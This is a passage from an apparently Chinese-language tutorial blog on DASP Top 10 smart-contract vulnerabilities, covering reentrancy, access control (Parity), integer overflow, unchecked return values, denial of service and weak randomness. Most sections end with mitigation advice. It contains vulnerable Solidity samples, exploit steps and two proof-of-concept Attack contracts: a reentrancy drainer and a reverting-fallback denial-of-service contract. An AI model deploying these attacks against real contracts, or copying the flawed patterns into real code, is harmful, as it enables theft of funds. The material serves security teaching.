userBalances[user];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">addToBalance</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        userBalances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdrawBalance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        uint amountToWithdraw = userBalances[msg.sender];</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(amountToWithdraw)() ==<span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        userBalances[msg.sender] = <span class="number">0</span>;  <span class="comment">//这里先throw，再归零</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address vulnerable_contract;</span><br><span class="line">    uint attackCount;</span><br><span class="line">    address <span class="keyword">public</span> owner;</span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">()</span> <span class="keyword">public</span></span>&#123;</span><br><span class="line">        attackCount = <span class="number">2</span>;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable&#123;    <span class="comment">//在这里，可以肆意操作一波</span></span><br><span class="line">        <span class="keyword">while</span>(attackCount&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            attackCount--;</span><br><span class="line">            require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">deposit</span><span class="params">(address _vulnerable_contract)</span> <span class="keyword">public</span> payable</span>&#123;</span><br><span class="line">        vulnerable_contract = _vulnerable_contract;</span><br><span class="line">        require(vulnerable_contract.call.value(msg.value)(bytes4(keccak256(<span class="string">"addToBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">withdraw</span><span class="params">()</span></span>&#123;</span><br><span class="line">        require(vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdrawBalance()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">function <span class="title">getBalance</span><span class="params">()</span> <span class="title">returns</span><span class="params">(uint)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="避坑方法"><a href="#避坑方法" class="headerlink" title="避坑方法"></a>避坑方法</h2><p>很多方法都可以帮助避免智能合约中潜在的重新入口漏洞。</p>
<p>第一种方法是，当发送以太币到外部合约时，使用内置的transfer()函数。Transfer()函数只发送2300个gas，这不足以使目的地址/合约调用另一个合约（例如，重新进入发送中的合约）。</p>
<p>第二个方法是，在以太币被从合约（或任何外部调用）发送出去之前，确保所有改变状态变量的逻辑发生。将执行外部调用的任何代码作为本地化函数或代码执行的最后一个操作，并将执行外部调用的代码置于未知地址上。这就是所谓的「检查-效应-交互」模式。</p>
<p>第三个方法是，引入一个互斥系统。也就是说，添加一个状态变量，该状态变量在代码执行期间锁定合约，从而防止重新入口的调用。</p>
<hr>
<h1 id="top-2-Access-Control"><a href="#top-2-Access-Control" class="headerlink" title="top 2 Access Control"></a>top 2 Access Control</h1><h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>攻击者通过合约不安全的可见性设置时可以直接访问合约的私有变量和函数，这其中需要可能需要绕过一些访问控制。</p>
<h2 id="background-1"><a href="#background-1" class="headerlink" title="background"></a>background</h2><h3 id="0x01-函数访问域关键字"><a href="#0x01-函数访问域关键字" class="headerlink" title="0x01 函数访问域关键字"></a>0x01 函数访问域关键字</h3><p>在使用Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为private，external函数为合约接口，只能被其他合约调用（在自身需通过this.f()调用），internal函数只能被自身调用。</p>
<h3 id="0x02-tx-origin"><a href="#0x02-tx-origin" class="headerlink" title="0x02 tx.origin"></a>0x02 tx.origin</h3><p>tx.origin不安全。（现在被禁用了）<br>tx.origin返回地址是源调用地址，而msg.sender返回地址是直接调用地址。</p>
<h3 id="0x03-delegatecall"><a href="#0x03-delegatecall" class="headerlink" title="0x03 delegatecall"></a>0x03 delegatecall</h3><p>delegatecall的滥用。<br>delegatecall调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。<br>call外部调用后上下文是自身。</p>
<p>像这样：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract A &#123;</span><br><span class="line">    <span class="function">event <span class="title">callMeMaybeEvent</span><span class="params">(address _from)</span></span>;</span><br><span class="line">    <span class="function">function <span class="title">callMeMaybe</span><span class="params">()</span> payable <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        callMeMaybeEvent(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    <span class="function">function <span class="title">callTheOtherContract</span><span class="params">(address _contractAddress)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        require(_contractAddress.call(bytes4(keccak256(<span class="string">"callMeMaybe()"</span>))));</span><br><span class="line">        require(_contractAddress.delegatecall(bytes4(keccak256(<span class="string">"callMeMaybe()"</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">library SomeLib &#123;</span><br><span class="line">    <span class="function">event <span class="title">calledSomeLib</span><span class="params">(address _from)</span></span>;</span><br><span class="line">    <span class="function">function <span class="title">calledSomeLibFun</span><span class="params">()</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">        calledSomeLib(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="实例-Parity"><a href="#实例-Parity" class="headerlink" title="实例 Parity"></a>实例 Parity</h2><p>Parity就被这么搞过。</p>
<p>黑客通过 delegatecall 调用 initWallet 函数， initWallet 没有检查以防止攻击者在合同初始化后调用到 initMultiowned ，漏洞使得黑客能通过 library 库函数，让自己成为多个 Parity 钱包的新主人，然后调用转账函数把钱转走。</p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p>1.initWallet 函数可以改变合约的 owner 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function initWallet(address[] _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">  initDaylimit(_daylimit);</span><br><span class="line">  initMultiowned(_owners, _required);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.代码里使用了 delegatecall() 函数，导致所有 public 函数对所有人可见。包括 initWallet 函数。而且 initWallet 函数也没有作任何防护措施。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function() payable &#123;</span><br><span class="line">  <span class="comment">// just being sent some cash?</span></span><br><span class="line">  <span class="keyword">if</span> (msg.value &gt; <span class="number">0</span>)</span><br><span class="line">    Deposit(msg.sender, msg.value);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (msg.data.length &gt; <span class="number">0</span>)</span><br><span class="line">    _walletLibrary.delegatecall(msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.攻击者先获取owner权限，将调用函数的指令放在Data中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function: initWallet(address[] _owners, uint256 _required, uint256 _daylimit) ***</span><br></pre></td></tr></table></figure>
<p>4.然后执行execute获取所有 funds</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function: execute(address _to, uint256 _value, bytes _data) ***</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="top-3-Arithmetic-Issues"><a href="#top-3-Arithmetic-Issues" class="headerlink" title="top 3 Arithmetic Issues"></a>top 3 Arithmetic Issues</h1><h2 id="0x00-info"><a href="#0x00-info" class="headerlink" title="0x00 info"></a>0x00 info</h2><p>Arithmetic Issues为DASP TOP10的第三类漏洞。这类漏洞比较常见。</p>
<blockquote>
<p>also known as integer overflow and integer underflow</p>
</blockquote>
<h2 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h2><p>传统而经典的整形溢出问题。<br>比如说uint8:</p>
<blockquote>
<p>(uint) 0 - 1 = 255</p>
</blockquote>
<h2 id="0x02-场景"><a href="#0x02-场景" class="headerlink" title="0x02 场景"></a>0x02 场景</h2><p>1.没有检查下溢<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint _amount) &#123;</span><br><span class="line">    require(balances[msg.sender] - _amount &gt; 0); // 如果 _amount &gt; msg.sender, underflow </span><br><span class="line">    msg.sender.transfer(_amount);  // 会transfer一个很大的值</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.off-by-one<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function popArrayOfThings() &#123;</span><br><span class="line">    require(arrayOfThings.length &gt;= 0);</span><br><span class="line">    arrayOfThings.length--;  // length是uint，当length=0，length--会下溢翻转；同样++也需要注意</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x03上溢漏洞"><a href="#0x03上溢漏洞" class="headerlink" title="0x03上溢漏洞"></a>0x03上溢漏洞</h2><p>可发生在转账金额很大、余额不足时，判断条件里出现上溢，造成转账成功</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上溢</span></span><br><span class="line"><span class="function">function <span class="title">_transfer</span><span class="params">(address _from, address _to, uint _value)</span> internal </span>&#123;</span><br><span class="line">    <span class="comment">/* Check if the sender has enough value */</span></span><br><span class="line">    require (balanceOf[_from] &gt;= _value + burnPerTransaction); <span class="comment">// boom!</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-下溢漏洞"><a href="#0x04-下溢漏洞" class="headerlink" title="0x04 下溢漏洞"></a>0x04 下溢漏洞</h2><p>下溢漏洞首先要理解solidity中状态变量的存储模型。</p>
<blockquote>
<p>合约的存储有一个指针，合约的变量都存储在以这个指针为基址的偏移地址中。</p>
</blockquote>
<blockquote>
<p>大小固定的变量存储在一个槽中。</p>
</blockquote>
<blockquote>
<p>大小不定的变量，如mapping和不定长数组:</p>
</blockquote>
<blockquote>
<blockquote>
<p>mapping的定义位置占一个槽，但其中无数据，数据存储位置由keccak(k,p)计算。</p>
</blockquote>
</blockquote>
<blockquote>
<blockquote>
<p>不定长数组定义的位置占一个槽，其中存储数组长度，数据存储位置由keccak(k,p)计算。</p>
</blockquote>
</blockquote>
<p>理解了上述存储模型，当数组长度发生下溢时，数组长度变得很大，造成溢出，即可通过keccak(k,p)计算并修改任何位置的数据。这有点像二进制中的栈溢出和任意内存读写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address public owner;</span><br><span class="line">address public trustedThirdParty;</span><br><span class="line">mapping (address =&gt; uint) public balanceOf;</span><br><span class="line">uint public deposited;</span><br><span class="line">uint public withdrawLimit;</span><br><span class="line">uint[] public bonusCodes;</span><br></pre></td></tr></table></figure>
<p>此时storage中的情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;storage&quot;:&#123;</span><br><span class="line">    0x00 : (address)owner,</span><br><span class="line">    0x01 : (address)trustedThirdParty,</span><br><span class="line">    0x02 : (mapping)balanceOf,</span><br><span class="line">    0x03 : (uint)deposited,</span><br><span class="line">    0x04 : (uint)withdrawLimit,</span><br><span class="line">    0x05 : (uint[])bonusCodes</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>下面当bonusCodes.length = 0, 通过bonusCodes.length–，bonusCodes.length = (很大)， 几乎覆盖了所有storage，其它变量也被覆盖到了数组中，故找到变量实际位置对应数组下标，就可以通过修改数组从而修改该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function popBonusCode() onlyOwner &#123;</span><br><span class="line">    require(bonusCodes.length &gt;= 0);</span><br><span class="line">    bonusCodes.length--;   // boom!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="避坑方法-1"><a href="#避坑方法-1" class="headerlink" title="避坑方法"></a>避坑方法</h2><p>防止溢出/下溢漏洞的常规方法是，使用或构建数学库来替代标准的数学运算符，包括加法、减法和乘法（没有除法，因为它不会导致溢出/下溢）。</p>
<p>OppenZepplin在构建和审核安全库方面做了大量的工作，以太坊社区可以充分利用这些库。</p>
<hr>
<p>#top 4 Unchecked Return Values</p>
<h2 id="Info-1"><a href="#Info-1" class="headerlink" title="Info"></a>Info</h2><p>字面意思是没有检查一些不安全调用函数的返回值。<br>我理解是因为调用了一些不安全函数，由于没有检查返回值，造成运行时错误，但行为不可逆，代码继续执行，造成不可预料的恶果。</p>
<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h3 id="background-2"><a href="#background-2" class="headerlink" title="background"></a>background</h3><p>先来看一个这几个函数</p>
<table>
<thead>
<tr>
<th>函数</th>
<th>特性</th>
</tr>
</thead>
<tbody>
<tr>
<td>address.transfer()</td>
<td>1. 失败抛出异常且回滚 2. 提供2300gas，防止reentrancy</td>
</tr>
<tr>
<td>address.send()</td>
<td>1. 失败返回false 2. 提供2300gass，防止reentrancy</td>
</tr>
<tr>
<td>address.call.value().gas()()</td>
<td>1. 失败返回false 2. 发送所有可用gas</td>
</tr>
</tbody>
</table>
<p>1.address.transfer()和address.send()可以防止重入漏洞，然而这样花2300gas就能做一些操作。<br>2.address.call.value().gas()()不能防止Reentrancy。</p>
<p>gas溢出和超过调用栈限制这两点导致的发送失败很容易被忽略。solidity特性中存在一些不安全的函数call(),callcode()(已经遗弃),delegatecall()和send()。</p>
<blockquote>
<p><strong>这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果。</strong></p>
</blockquote>
<h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。</span></span><br><span class="line"><span class="function">function <span class="title">withdraw</span><span class="params">(uint256 _amount)</span> <span class="keyword">public</span> </span>&#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] -= _amount;</span><br><span class="line">    etherLeft -= _amount;</span><br><span class="line">    msg.sender.send(_amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>msg.sender为一个智能合约，其中未定义fallback函数，或者callstack已满，均会导致send失败，而函数未检出send返回值，因为<strong>这个函数在运行错误时行为并不可逆，仅会返回false，代码流程也会继续，这就会带来很多不可预期的结果</strong>，最终导致msg.sender和etherLeft数量减少且状态不可逆转，最后却没有取回减少的钱。</p>
<h2 id="避坑技巧"><a href="#避坑技巧" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>在可能的情况下，如果外部交易复原，则使用transfer()函数而不是send()函数作为复原的方式。如果需要send()，需要始终确保对返回值的检查。</p>
<p>当然，更好的方式是采用withdrawal模式，这个模式中每个用户都需要调用一个独立的函数（例如 withdraw函数）来处理从合约中发送以太币的问题，因此独立处理发送交易失败的结果。</p>
<p>这个想法是从逻辑上将外部发送函数从代码基础的其余部分分离出来，并将可能失败交易的负担放到了调用withdraw函数的最终用户身上。</p>
<hr>
<h1 id="top-5-Denial-of-Services"><a href="#top-5-Denial-of-Services" class="headerlink" title="top 5 Denial of Services"></a>top 5 Denial of Services</h1><h2 id="Info-2"><a href="#Info-2" class="headerlink" title="Info"></a>Info</h2><p>在智能合约中，当 超过gas限制，异常抛出，非预期的终止合约，访问控制被破坏 均会产生合约拒绝服务问题。</p>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="GovernMental"><a href="#GovernMental" class="headerlink" title="GovernMental"></a>GovernMental</h3><p>规则大概为投资者捐最少1ETH给政府，如果政府在最近12小时内没有收到任何捐赠，则将奖金发给最后一名投资人，而如果收到奖励，则按一定比例分别将钱分给资金池、政府及投资人。<br>其中在大于12小时未收到赞助的逻辑分支中，将奖金分给最后一名投资人后会重置所有投资人：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (lastTimeOfNewCredit + TWELVE_HOURS &lt; block.timestamp) &#123;</span><br><span class="line">    // Return money to sender</span><br><span class="line">    msg.sender.send(amount);</span><br><span class="line">    // Sends all contract money to the last creditor</span><br><span class="line">    creditorAddresses[creditorAddresses.length - 1].send(profitFromCrash);</span><br><span class="line">    corruptElite.send(this.balance);</span><br><span class="line">    // Reset contract state</span><br><span class="line">    lastCreditorPayedOut = 0;</span><br><span class="line">    lastTimeOfNewCredit = block.timestamp;</span><br><span class="line">    profitFromCrash = 0;</span><br><span class="line">    creditorAddresses = new address[](0);    // out of gas!!</span><br><span class="line">    creditorAmounts = new uint[](0);         // out of gas!!</span><br><span class="line">    round += 1;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果creditors过多的话，会消耗大于当前最大gas数量导致合约失效。</p>
<h3 id="King-of-the-Ether"><a href="#King-of-the-Ether" class="headerlink" title="King of the Ether"></a>King of the Ether</h3><p>模仿King of the Ether游戏规则，当你向合约发送比现在price多的eth时，你就可以成为总统，之前的总统会收到当前price的补偿，且当前price翻倍。<br>而争夺者为一个合约且在fallback函数中恶意抛出异常，则可以破坏游戏规则永远成为总统。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract PresidentOfCountry &#123;</span><br><span class="line">    address <span class="keyword">public</span> president;</span><br><span class="line">    uint256 <span class="keyword">public</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">PresidentOfCountry</span><span class="params">(uint256 _price)</span> </span>&#123;</span><br><span class="line">        require(_price &gt; <span class="number">0</span>);</span><br><span class="line">        price = _price;</span><br><span class="line">        president = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">becomePresident</span><span class="params">()</span> payable </span>&#123;</span><br><span class="line">        require(msg.value &gt; price); <span class="comment">// must pay the price to become president</span></span><br><span class="line">        president.transfer(price);   <span class="comment">// we pay the previous president</span></span><br><span class="line">        president = msg.sender;      <span class="comment">// we crown the new president</span></span><br><span class="line">        price = price * <span class="number">2</span>;           <span class="comment">// we double the price to become president</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    function () &#123; revert(); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">Attack</span><span class="params">(address _target)</span> payable </span>&#123;</span><br><span class="line">        _target.call.value(msg.value)(bytes4(keccak256(<span class="string">"becomePresident()"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Attack合约部署后通过构造函数调用PresidentOfCountry合约的becomePresident()函数，同时发送大于price的eth，则执行becomePresident逻辑，1. 向之前的账户发送price补偿；2. 自己合约账户变为president；3. price翻倍。</p>
<p>当其他正常账户参与游戏调用becomePresident逻辑时，同样会向attach合约地址（当前president）发送price，正因为当前president不是普通账户还是合约账户，transfer会触发合约中fallback函数，而恶业攻击者在fallback中执行了revert()，导致异常，从而无法执行后续变更总统和价格的逻辑。造成合约DOS。</p>
<h2 id="避坑技巧-1"><a href="#避坑技巧-1" class="headerlink" title="避坑技巧"></a>避坑技巧</h2><p>在第一个例子中，合约不应该在由外部用户人为操纵的数据结构中循环。可以使用withdrawal，即每个投资者都调用一个撤回函数来独立地声明代币。</p>
<p>在上面的第二个例子中，要求特权用户更改合约状态。在这个例子中，当owner丧失能力时，可以使用故障保护装置。一个解决方案是将owner设置为一个多重签名合约。</p>
<p>另一个解决方案是使用一个时间锁，其中需要在第13行代码中，包括一个基于时间的机制，比如</p>
<p><code>require(msg.sender == owner || now &gt; unlockTime)</code></p>
<p>这允许任何用户在一段时间之后最终确认，该时间由unlockTime指定。这种方法也可以用在第三个例子中。</p>
<p>如果需要外部调用才能进入一个新状态的话，则要考虑到它们可能出现的故障，并可能增加一个基于时间的状态进程，否则所希望的调用可能永远不会出现。</p>
<hr>
<h1 id="top-6-Bad-Randomness"><a href="#top-6-Bad-Randomness" class="headerlink" title="top 6 Bad Randomness"></a>top 6 Bad Randomness</h1><h2 id="Info-3"><a href="#Info-3" class="headerlink" title="Info"></a>Info</h2><p>绝对的随机在Ethereum中很难实现，因为所有参数都可以在透明的链上查询，因此想要利用随机特性生成逻辑很容易出现问题。solidity中提供了一些获取随机数的方法，如果种子选取不当，很容易被预测。</p>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">uint256 private seed;</span><br><span class="line"></span><br><span class="line">function play() public payable &#123;</span><br><span class="line">    require(msg.value &gt;= 1 ether);</span><br><span class="line">    iteration++;</span><br><span class="line">    uint randomNumber = uint(keccak256(seed + iteration));</span><br><span class="line">    if (randomNumber % 2 == 0) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用私有变量seed和iteration通过keccak256 hash计算得到随机数，虽然seed属性为private，但是它也要在某个时间点设置，可以通过链上相关tx来获取其值，因此随机性可预测。</p>
<h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function play() public payable &#123;</span><br><span class="line">    require(msg.value &gt;= 1 ether);</span><br><span class="line">    if (block.blockhash(blockNumber) % 2 == 0) &#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里使用block.blockhash(blockNumber)来计算随机数，在solidity中，block.blockhash(uint blockNumber) returns (bytes32)只计算就近的256个块hash，如果blockNumber为当前块（block.number）或者超过256更久远的块，计算结果都是0。</p>
<p>同时Solidity文档也强调尽量不要使用<strong>block.timestamp、now和block.blockhash</strong>计算随机数。</p>
<h2 id="案例一-SmartBillions"><a href="#案例一-SmartBillions" class="headerlink" title="案例一 SmartBillions"></a>案例一 SmartBillions</h2><p><a href="https://www.reddit.com/r/ethereum/comments/74d3dc/smartbillions_lottery_contract_just_got_hacked/" target="_blank" rel="noopener">SmartBillions lottery contract just got hacked!</a></p>
<p>这是一个赌博合约，黑客在256块后调用won（此时hash结果为0）赢得奖金。</p>
<h2 id="案例二-theRun"><a href="#案例二-theRun" class="headerlink" title="案例二 theRun"></a>案例二 theRun</h2><p>合约中利用random(unit Max)函数进行随机数生成，而生成因子主要是利用block.timestamp和block.number，而时间戳可以由矿工操控，故矿工可以选择有利的随机数来提高获取奖励的概率。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function Participate(uint deposit) private &#123;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    // Winning the Pot :) Condition : paying at least 1 people with deposit &gt; 2 ether and having luck !</span><br><span class="line">    if(  ( deposit &gt; 1 ether ) &amp;&amp; (deposit &gt; players[Payout_id].payout) )&#123; </span><br><span class="line">        uint roll = random(100); //take a random number between 1 &amp; 100</span><br><span class="line">        if( roll % 10 == 0 )&#123; //if lucky : Chances : 1 out of 10 ! </span><br><span class="line">            msg.sender.send(WinningPot); // Bravo !</span><br><span class="line">            WinningPot=0;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint256 constant private salt =  block.timestamp;</span><br><span class="line"></span><br><span class="line">function random(uint Max) constant private returns (uint256 result)&#123;</span><br><span class="line">    //get the best seed for randomness</span><br><span class="line">    uint256 x = salt * 100 / Max;</span><br><span class="line">    uint256 y = salt * block.number / (salt % 5) ;</span><br><span class="line">    uint256 seed = block.number/3 + (salt % 300) + Last_Payout +y; </span><br><span class="line">    uint256 h = uint256(block.blockhash(seed)); </span><br><span class="line"></span><br><span class="line">    return uint256((h / x)) % Max + 1; //random number between 1 and Max</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
